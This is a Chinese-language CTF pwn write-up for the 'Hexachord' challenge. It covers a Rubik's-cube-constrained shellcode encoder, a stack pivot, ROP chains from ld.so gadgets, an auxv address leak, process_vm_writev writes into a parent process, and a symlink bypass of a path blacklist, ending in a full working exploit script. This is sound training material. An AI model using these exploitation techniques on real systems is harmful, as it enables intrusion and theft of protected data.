# Hexachord

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 容器题 |
| 附件 | 无（平台未提供附件；目录内的 `exp/` 是随题解给出的复现包，含实验代码与礼物程序样本） |
| 目标 | 47.95.113.113:20549 |

Flag：flag{...}（终章密文解密所得，密文与恢复过程见「二十章账本与开碑」一节）

题目说明：古堡幽深，六弦琴久寂；今琴灵忽醒，以六音为律，封终章碑文于二十乐章之中。每章皆藏残章一枚，须入秘境亲取。至少破三章，石碑乃现；集齐二十残章，碑文方得重铸。

## 2. 题目分析

### 会话与二十章

服务在一条TCP连接里连续走完二十个乐章，残章、结算与终章密文都绑定在这条会话上，中途换连接会破坏份额与密文的对应关系。每章先输出`target: `加80个十六进制字符，表示40字节魔方状态，然后给出菜单：

```text
1) 调弦
2) 翻阅琴谱
3) 开辟共鸣腔
4) 弹奏
5) 哑弦
6) 离去
```

菜单4接收至多31字节咒文，校验器比对通过后回显`ACCEPT`，同一串字节紧接着作为x86-64机器码执行。发送`6`进入下一章，外层wrapper在离开时才确认“残章到手”并计分。

### 魔方状态与转动表

`target`的40字节按`cp[8] || co[8] || ep[12] || eo[12]`切分，依次是角块置换、角块朝向、棱块置换、棱块朝向。复原态为`cp=0..7`、`co`全1、`ep=0..11`、`eo`全1。

转动表是一段0x118字节的二进制，六个面依次存放8字节`CP`、8字节`CO`、12字节`EP`、12字节`EO`。执行一次顺时针四分之一转时，置换按表重排索引，角块朝向用GF(4)乘法，棱块朝向模3相乘。朝向从1开始计数而不是0，这是它与常见Kociemba面串的差别所在。

```python
def gf4mul(a, b):
    return (1, 2, 3)[((1, 2, 3).index(a) + (1, 2, 3).index(b)) % 3]

def move(state, m):
    cp, co, ep, eo = state
    return (bytes(cp[i] for i in CP[m]),
            bytes(gf4mul(co[i], CO[m][j]) for j, i in enumerate(CP[m])),
            bytes(ep[i] for i in EP[m]),
            bytes((eo[i] * EO[m][j]) % 3 for j, i in enumerate(EP[m])))
```

### 双重语义的咒文

校验器只读原始字节，`byte % 6`决定执行`URFDLB`中的哪一个顺时针四分之一转，与字符、编码无关；同一串字节随后又被当作代码执行。于是每个字节同时承担两种语义：余数必须让魔方走向`target`，数值本身又必须是指令流中有用的一字节指令。

可用的单字节等价指令：

| 面 | 余数 | 等价指令 |
| --- | --- | --- |
| U | 0 | `0x90 nop` |
| R | 1 | `0x91 xchg eax,ecx` |
| F | 2 | `0xf8 clc` |
| D | 3 | `0xf9 stc` |
| L | 4 | `0x64 fs前缀` |
| B | 5 | `0x65 gs前缀` |

关键的三个双关字节是`0x5a`（90，`U`且`pop rdx`）、`0x5c`（92，`F`且`pop rsp`）、`0xc3`（195，`D`且`ret`）。只要解出的公式里存在“可弹栈的面、`F`、`D`”这样的子序列，就能把公式本身变成栈迁移跳板。`L`后面若还有公式步，可写成`0xb2 imm8`（`mov dl,imm8`），让立即数承担下一面的余数，一次编码两步；枢轴之后的剩余字节只用于满足余数校验，写成`0x30+面序号`即可。

### 求解与视角轮换

随机目标通常需要18~21步，31字节预算看似宽裕，实际搜索空间约4.3×10¹⁹。复现包在连接前先建好复原侧的投影树，用Kociemba的`twist/flip/slice`坐标打包成`(twist*2048+flip)*495+slice`，约5070万个投影节点，从复原态正向展开深度12，求解时从`target`反向展开深度10，两者在投影坐标相交后沿父指针回放出`URFDLB`序列。压缩表约1GiB，Numba编译后建表只需数秒；另有深度10/9的快速表，用于低成本命中。

求解目标不只是“能还原”，而是“公式里含有可编码的枢轴子序列”。程序按成本递增依次尝试：快速表恒等视角2秒、强表恒等视角19秒、快速表四种旋转视角、强表四种镜像视角。视角来自48个魔方对称变换中的4个旋转与4个镜射；命中后把公式逐字符逆变换回原坐标，再交给编码器。同一目标在不同视角下步数与形状都不同，换视角往往就能凑出所需子序列。

### 菜单1/2与栈布局

菜单1把恰好112字节的祷文写进BSS的`PIE+0x5060`，这是后续ROP链的落点。菜单2把路径按原始字节读入栈缓冲，最多255字节，其中偏移`0xf0`的8字节槽位会被枢轴当作返回地址弹出，填`PIE+0x5060`；走`leave`入口时填`PIE+0x5058`，让`leave`先弹掉一个无害qword再`ret`到`PIE+0x5060`。

路径载荷以短串加`NUL`开头，末尾不带换行，并用填充凑满255字节，这样读入会写满到0xf0之后的槽位，而不是在换行处提前截断。

### 用`/proc/64/auxv`取地址

PIE与ld.so基址每章都随机，但菜单2可以读任意路径。`/proc/64/auxv`是容器内服务父进程的辅助向量，16字节一对`<QQ>`（tag、value），从`AT_SYSINFO_EHDR(33)`开始，遇`tag==0`结束。

`AT_PHDR(3)`指向内存中的程序头，ELF程序头在文件内偏移0x40处，因此`PIE = AT_PHDR - 0x40`；`AT_BASE(7)`就是动态链接器基址；`AT_RANDOM(25)`与`AT_EXECFN(31)`给出初始栈的范围，需要回显栈内容时可据此限定长度。选auxv而不选`/proc/self/maps`，是因为它是定长二进制对，一次就读到加载器基址，省掉先泄漏libc的环节；PID64是容器PID命名空间里服务的固定编号，与后面`process_vm_writev(64,...)`指向同一个父进程。

gadget全部取自ld.so：

| 用途 | 偏移 |
| --- | --- |
| `pop rdi; pop rbp; ret` | `ld+0x25AC` |
| `pop rsi; pop rbp; ret` | `ld+0x599B` |
| `pop rdx; leave; ret` | `ld+0x1F5FB` |
| `pop rax; ret` | `ld+0x1548B` |
| `syscall; ret` | `ld+0x16629` |
| `mprotect@plt` | `PIE+0x1344` |
| `_exit(0)` | `PIE+0x2414` |

### fork子进程与`process_vm_writev`回写

菜单1/2/4都是一次性动作，状态由BSS页`PIE+0x5000`里的三个标记控制：`tuned`在页内偏移`0x40`（4字节），`read_once`与`spell_once`在`0x48`（共8字节）。校验通过后服务fork，由子进程执行咒文；子进程看到的标记已经置1，执行完就退出，父进程对此一无所知。因此只在子进程里清标记没有意义，必须把子进程改好的整页写回父进程。

第一段祷文正是这个序列：`mprotect(PIE+0x5000,0x1000,7)`把该页改成可读写可执行，随后一段31字节代码清零`[PIE+0x5048]`与`[PIE+0x5040]`，再用`process_vm_writev`（系统调用号311）把本进程的这一页写进PID64的同址页。成功后父进程的菜单1/2/4重新可用，同一章内还能第二次调弦、翻阅、弹奏。

31字节够用，是因为进入这段代码时寄存器已经就位：`mprotect`成功返回`RAX=0`，同时`RDI=PIE+0x5000`、`RSI=0x1000`、`RDX=7`，`RBP`里还留着`call`要用的`syscall;ret`gadget。

### 黑名单与`/tmp/x`

菜单2对含`flag`的路径会拒绝，但拒绝发生在255字节读入栈缓冲之后：`0xf0`槽位照样被写好，`read_once`也没有被消耗，所以随后还能再读一次文件。第二段祷文用纯ROP调`__NR_symlink=88`，把`/flag`链到`/tmp/x`；两条路径字符串直接写在祷文尾部，所有系统调用都经ld.so里的`syscall;ret`发起，避免原始`0f 05`字节被wrapper的指令过滤拦下。之后读`/tmp/x`就得到66位十六进制残章。

### 残章与终章密钥

礼物程序读入`flag`文件，用`getrandom`取32字节密钥，为每个密钥字节生成一个17次多项式，二十章各给出一组取值，并打印20条收据与`flag.enc`。每条残章66位hex即33字节：1字节来源标签加32字节份额。17次多项式由18个点唯一确定，所以至少需要18条有效记录；少于18条时插值出的密钥必然错误，AES-GCM的tag校验也会失败。

标签只用于区分来源，插值时按计分顺序重编为`x=1..18`，第15章缺章不会在横坐标上留下空洞，重编号后的点集仍落在同一组17次多项式上，零处取值不变。

## 3. 解题过程

### 会话时序与帧定界

整条链只开一个socket，先等`target: <80hex>`出现，然后每章按固定顺序走：读auxv（菜单2）→调弦（菜单1，写第一段祷文）→布栈（菜单2，写255字节）→弹奏（菜单4，发咒文）→确认两次`ACCEPT`→读`/tmp/x`取残章→发`6`离开。菜单提示是固定字节串`卷轴: `、`祷文: `、`咒文: `，菜单尾部是`6) 离去\n> `；收发按字节匹配，不能用行读取，因为auxv回显含NUL和任意二进制。

```python
TARGET = re.compile(rb"target:\s*([0-9a-f]{80})")
MENU = "6) 离去\n> ".encode()
FULL_MENU = ("1) 调弦\n2) 翻阅琴谱\n3) 开辟共鸣腔\n"
             "4) 弹奏\n5) 哑弦\n6) 离去\n> ").encode()
FRAGMENT = re.compile(rb"(?<![0-9a-f])([0-9a-f]{66})(?![0-9a-f])")

def until(self, marker, timeout=20):
    deadline = time.monotonic() + timeout
    while True:
        pos = self.buffer.find(marker)
        if pos >= 0:
            end = pos + len(marker)
            out = bytes(self.buffer[:end])
            del self.buffer[:end]
            return out
        self._fill(deadline)
```

魔方搜索放在后台线程与网络IO并行：每章一开始就把`target`交给线程，等auxv读完、祷文写完再取结果，搜索时间与IO时间重叠。wrapper自身有章节超时，超时会主动推进到下一章并打印新的`target`；此时旧章已无法提交，程序检测到“未请求的target”就改用新目标继续，该章记为未计分，避免中断整条链。

### 求解与咒文编码

先把`target`的80个hex解成40字节，构造`State(cp,co,ep,eo)`，用预计算树求出`URFDLB`序列，再逐字节编码。编码器按顺序尝试三种入口：`pop面`→`F`→`D`配`pop rsp;ret`，`pop面`→`D`→`D`→`D`配`pop rbp;leave;ret`，以及`pop`/`BL`/`D`的更宽松组合；前两种失败时再尝试`ret imm8`跳过一字节与隐藏回环入口。每次编码后都要断言三条性质：长度与原公式相等且不超过31、逐字节`%6`与公式面一致、`State().play(spell)`等于`target`。

```python
POP = {'U': 0x5a, 'R': 0x5b, 'D': 0x5d, 'L': 0x58, 'B': 0x59}
SINGLE = {'U': 0x90, 'R': 0x91, 'F': 0xf8, 'D': 0xf9, 'B': 0xf5}
FACES = "URFDLB"

def harmless_prefix(formula):
    out, i = bytearray(), 0
    while i < len(formula):
        if formula[i] == 'L' and i + 1 < len(formula):
            out += bytes((0xb2, 0x30 + FACES.index(formula[i + 1])))
            i += 2
        else:
            out.append(SINGLE.get(formula[i], 0x40))
            i += 1
    return bytes(out)

def encode_pivot3(formula):
    for i in range(len(formula) - 2):
        for j in range(i + 1, len(formula) - 1):
            for k in range(j + 1, len(formula)):
                if formula[i] in POP and formula[j] == 'F' and formula[k] == 'D':
                    return (harmless_prefix(formula[:i]) + bytes((POP[formula[i]],))
                            + harmless_prefix(formula[i+1:j]) + b'\x5c'
                            + harmless_prefix(formula[j+1:k]) + b'\xc3'
                            + bytes(0x30 + FACES.index(c) for c in formula[k+1:]))
    raise ValueError("no pop/F/D subsequence")
```

`leave`入口用`pop rbp`（`0x5d`）接`0xc9`（`leave`，201%6=3）再接`0xc3`，三个字节都落在`D`上，正好消耗公式里连续三个`D`，布栈时把0xf0槽位改填`PIE+0x5058`。

### 读auxv与布栈

读`/proc/64/auxv`的响应先剥掉`卷轴: `标记，之后每16字节解一对`<QQ>`，遇`tag==0`停止，必须同时存在3、7、25、31四项。算出`pie=aux[3]-0x40`、`ld=aux[7]`、`prayer=pie+0x5060`，祷文与栈上地址全部由这两个基址派生，所以每章都要重取一次，上一章的数值不能复用。

```python
def parse_auxv_response(data):
    raw = data[data.index("卷轴: ".encode()) + len("卷轴: ".encode()):]
    result = {}
    for pos in range(0, len(raw) - 15, 16):
        key, value = struct.unpack_from("<QQ", raw, pos)
        if key == 0:
            break
        result[key] = value
    assert 3 in result and 7 in result and 25 in result
    return result

def stack_spray(aux, spray_delta=0):
    pie = aux[3] - 0x40
    prayer = pie + 0x5060 + spray_delta
    payload = b"x\0" + b"A" * (0xF0 - 2) + struct.pack("<Q", prayer)
    payload += b"B" * (0xFF - len(payload))
    assert len(payload) == 0xFF and b"\n" not in payload
    return payload
```

### 第一段祷文：mprotect、清标记、回写父进程

112字节按qword排布，`q0`在`prayer+0`，`q1..q9`在`+8..+0x48`，31字节代码接在`+0x50`：

```text
q0 ld+0x25AC   pop rdi; pop rbp; ret
q1 pie+0x5000  mprotect 起始地址
q2 prayer+0x20 leave; ret 的新 rbp
q3 ld+0x1F5FB  pop rdx; leave; ret
q4 7           PROT_READ|WRITE|EXEC
q5 ld+0x599B   pop rsi; pop rbp; ret
q6 0x1000      mprotect 长度
q7 ld+0x16629  syscall;ret，进代码前被换进 rbp
q8 pie+0x1344  mprotect@plt（跳过 endbr64）
q9 prayer+0x50 31字节代码入口
```

链条成立的关键在`pop rdx; leave; ret`这个组合：`rdx`取到7之后，`leave`把`rsp`拉到`prayer+0x20`，于是`pop rbp`吃掉`q4`、`ret`跳到`q5`，用一个gadget同时完成“传参”和“跨过中间槽位”。`mprotect`返回0后`rax`清零、参数寄存器保持不变，`ret`落到`q9`。

31字节代码依次完成：清零`[rdi+0x48]`与`[rdi+0x40]`、`push rsi`（0x1000）、`push rdi`（页地址）、`push rsp; pop rsi`得到local iovec、`mov r10,rsi`复用同一结构作remote iovec、`mov dl,1`与`mov r8d,edx`各置计数1、`xor r9d,r9d`清flags、`push 64; pop rdi`指定父进程、`mov ax,311`选`process_vm_writev`、`call rbp`发起调用。

```text
48 89 47 48        mov [rdi+0x48], rax
48 89 47 40        mov [rdi+0x40], eax
56                 push rsi
57                 push rdi
54 5e              push rsp; pop rsi
49 89 f2           mov r10, rsi
b2 01              mov dl, 1
41 89 d0           mov r8d, edx
45 31 c9           xor r9d, r9d
6a 40 5f           push 64; pop rdi
66 b8 37 01        mov ax, 311
ff d5              call rbp
```

`call rbp`会把返回地址压在iovec下方，不影响iovec内容；iovec里的`iov_base=pie+0x5000`在父进程中同样有效，因为fork前后布局一致。载荷每次生成后都要扫描是否含`0f 05`，若某个gadget地址的字节恰好构成该序列，就换用`ld+0x25F66`、`ld+0x25F85`、`ld+0x25FC9`等备选`syscall;ret`。

### 第二段祷文：软链绕过黑名单

第二段祷文是纯ROP，10个qword加尾部字符串：`pop rax; ret`置88（`__NR_symlink`），`pop rdi; pop rbp; ret`取`prayer+80`（`/flag\0`），`pop rsi; pop rbp; ret`取`prayer+86`（`/tmp/x\0`），`ret`进`syscall;ret`，最后跳到服务的`_exit(0)`，免得子进程回到不可控的返回路径。

```python
def build_symlink_prayer(pie, ld, source=b"/flag", dest=b"/tmp/x"):
    prayer = pie + 0x5060
    strings = source + b"\0" + dest + b"\0"
    words = [
        ld + 0x1548B, 88,
        ld + 0x25AC, prayer + 80, 0,
        ld + 0x599B, prayer + 80 + len(source) + 1, 0,
        ld + 0x16629,
        pie + 0x2414,
    ]
    payload = (struct.pack("<Q", words[0]) + struct.pack("<9Q", *words[1:])
               + strings).ljust(112, b"\0")
    assert b"\x0f\x05" not in payload
    return payload
```

执行次序有讲究：先调弦写入symlink祷文，再发被拦的255字节路径完成布栈（这一步不读文件、也不消耗`read_once`），随后第二次弹奏触发symlink，最后读`/tmp/x`。被拦路径用`b"flag\0" + spray[5:]`，前五个字节触发黑名单，但0xf0处的8字节与原载荷完全一致，布栈效果不变而`read_once`未被消耗。

读回的响应去掉开头的`卷轴: `和结尾的完整菜单，用`(?<![0-9a-f])[0-9a-f]{66}(?![0-9a-f])`抓66位hex，前后加边界是为了不把菜单数字或更长的十六进制串误当残章。发送`6`之后，外层回显“残章到手”才算真正计分。

### 二十章账本与开碑

复现包在累计18枚有效残章后停止利用：第20章开始时不满足条件的章节直接发`6`离开，由wrapper给出结算。现场记录为第1至14章、第16至19章计分，第15章的公式没能编出可用枢轴，第20章在达到18枚后离开，结算`18/20`，终章原文给出`flag.enc`：

```text
[*] 演奏落幕：集得残章 18/20 枚
[*] 终章石碑 flag.enc: 80f3ff3c022c74662906117c8571e8b99e26bb5c6d509b9b1395de29864f8fdc5e4bb80c8a9430ee710c89fdfac1b53a663408f83230e0d38ee87e36478dfe59e4ce2d281e7f
```

账本只接受带`credited`或`final_received`状态的记录，按取得顺序把18条份额排成`x=1..18`，纵坐标取每条记录的后32字节；第15章缺章不会在横坐标上留下空洞。

插值在GF(256)上逐字节进行，约简多项式`0x11d`，即`xtime`溢出时异或`0x1d`；加法是异或，乘法用八轮“看最低位累加、左移、溢出补0x1d”的移位实现，除法取逆元`a^254`：

```text
K[b] = XOR_j ( y[j,b] * PRODUCT_{m != j} x[m] / (x[m] XOR x[j]) )
```

权重只依赖横坐标，先算好18个权重再逐字节累乘，32字节密钥一次得到。随后把`flag.enc`的原始字节切成`12字节nonce || 密文 || 16字节tag`，以`AESGCM(key).decrypt(nonce, 密文||tag, None)`解密。GCM的tag同时认证密钥与密文：份额不足、横坐标错位或混轮都会让tag校验失败，因此只有解密不抛异常时，明文才可作为最终提交值。

## 4. PoC

```python
import json, re, socket, struct, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

TARGET = re.compile(rb"target:\s*([0-9a-f]{80})")
MENU = "6) 离去\n> ".encode()
FULL_MENU = ("1) 调弦\n2) 翻阅琴谱\n3) 开辟共鸣腔\n"
             "4) 弹奏\n5) 哑弦\n6) 离去\n> ").encode()
FRAGMENT = re.compile(rb"(?<![0-9a-f])([0-9a-f]{66})(?![0-9a-f])")

class Proto:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=25)
        self.buffer = bytearray()

    def send(self, data):
        self.sock.sendall(data)

    def _fill(self, deadline):
        left = deadline - time.monotonic()
        if left <= 0:
            raise TimeoutError(bytes(self.buffer[-200:]))
        self.sock.settimeout(min(left, 1.0))
        try:
            chunk = self.sock.recv(65536)
        except socket.timeout:
            return
        if not chunk:
            raise EOFError(bytes(self.buffer[-200:]))
        self.buffer.extend(chunk)

    def until(self, marker, timeout=20):
        deadline = time.monotonic() + timeout
        while True:
            pos = self.buffer.find(marker)
            if pos >= 0:
                end = pos + len(marker)
                out = bytes(self.buffer[:end])
                del self.buffer[:end]
                return out
            self._fill(deadline)

def menu_read(p, path, timeout=20):
    p.send(b"2\n"); p.until("卷轴: ".encode(), timeout); p.send(path)
    return p.until(MENU, timeout)

def menu_tune(p, prayer, timeout=20):
    assert len(prayer) == 112
    p.send(b"1\n"); p.until("祷文: ".encode(), timeout); p.send(prayer)
    return p.until(MENU, timeout)

def menu_play(p, spell, timeout=20):
    assert 1 <= len(spell) <= 31 and b"\n" not in spell
    p.send(b"4\n"); p.until("咒文: ".encode(), timeout); p.send(spell + b"\n")
    out = p.until(MENU, timeout)
    assert b"ACCEPT\n" in out
    return out

def parse_auxv(data):
    raw = data[data.index("卷轴: ".encode()) + len("卷轴: ".encode()):]
    aux = {}
    for pos in range(0, len(raw) - 15, 16):
        tag, value = struct.unpack_from("<QQ", raw, pos)
        if tag == 0:
            break
        aux[tag] = value
    return aux

RESET_CODE = bytes.fromhex(
    "488947488947405657545e4989f2b2014189d04531c96a405f66b83701ffd5")

def reset_prayer(aux):
    pie, ld = aux[3] - 0x40, aux[7]
    prayer = pie + 0x5060
    words = [ld + 0x25AC, pie + 0x5000, prayer + 0x20, ld + 0x1F5FB, 7,
             ld + 0x599B, 0x1000, 0, pie + 0x1344, prayer + 0x50]
    for offset in (0x16629, 0x25F66, 0x25F85, 0x25FC9):
        words[7] = ld + offset
        payload = (struct.pack("<Q", words[0]) + struct.pack("<9Q", *words[1:])
                   + RESET_CODE).ljust(112, b"\0")
        if b"\x0f\x05" not in payload:
            return payload
    raise ValueError("no clean syscall gadget")

def symlink_prayer(pie, ld):
    prayer = pie + 0x5060
    words = [ld + 0x1548B, 88, ld + 0x25AC, prayer + 80, 0,
             ld + 0x599B, prayer + 86, 0, ld + 0x16629, pie + 0x2414]
    payload = (struct.pack("<10Q", *words) + b"/flag\0/tmp/x\0").ljust(112, b"\0")
    assert b"\x0f\x05" not in payload
    return payload

def spray(aux, delta=0):
    prayer = aux[3] - 0x40 + 0x5060 + delta
    out = b"x\0" + b"A" * (0xF0 - 2) + struct.pack("<Q", prayer)
    return out + b"B" * (0xFF - len(out))

def gf_mul(a, b):
    r = 0
    for _ in range(8):
        if b & 1: r ^= a
        carry = a & 0x80
        a = (a << 1) & 0xFF
        if carry: a ^= 0x1D
        b >>= 1
    return r

def gf_inv(a):
    r, base, e = 1, a, 254
    while e:
        if e & 1: r = gf_mul(r, base)
        base, e = gf_mul(base, base), e >> 1
    return r

def recover_key(shares):
    xs = [s[0] for s in shares[:18]]
    weights = []
    for i, xi in enumerate(xs):
        w = 1
        for j, xj in enumerate(xs):
            if i != j:
                w = gf_mul(w, gf_mul(xj, gf_inv(xi ^ xj)))
        weights.append(w)
    key = bytearray(32)
    for share, w in zip(shares[:18], weights):
        for i, y in enumerate(share[1:]):
            key[i] ^= gf_mul(y, w)
    return bytes(key)

def open_seal(enc_hex, fragments):
    shares = [bytes([i + 1]) + bytes.fromhex(f)[1:] for i, f in enumerate(fragments)]
    enc = bytes.fromhex(enc_hex)
    return AESGCM(recover_key(shares)).decrypt(enc[:12], enc[12:], None)

def run(host, port, solve):
    p = Proto(host, port)
    fragments = []
    head = p.until(b"target: ")
    target = TARGET.search(head + p.until(b"\n")).group(1).decode()
    for chapter in range(1, 21):
        if chapter == 1:
            p.until(MENU)
        aux = parse_auxv(menu_read(p, b"/proc/64/auxv\0"))
        plan = solve(target)                     # 返回 (spell, delta)
        if plan is None or len(fragments) >= 18:
            p.send(b"6\n")
            if chapter < 20:
                out = p.until(MENU)
                m = TARGET.search(out)
                if m is None:
                    break
                target = m.group(1).decode()
            continue
        spell, delta = plan
        menu_tune(p, reset_prayer(aux))
        menu_read(p, spray(aux, delta))
        menu_play(p, spell)
        pie, ld = aux[3] - 0x40, aux[7]
        menu_tune(p, symlink_prayer(pie, ld))
        menu_read(p, b"flag\0" + spray(aux, delta)[5:])
        menu_play(p, spell)
        reply = menu_read(p, b"/tmp/x\0")
        section = reply[len("卷轴: ".encode()):-len(FULL_MENU)]
        hit = FRAGMENT.search(section)
        if hit:
            fragments.append(hit.group(1).decode())
        p.send(b"6\n")
        if chapter < 20:
            out = p.until(MENU)
            m = TARGET.search(out)
            if m is None:
                break
            target = m.group(1).decode()
    return p, fragments
```
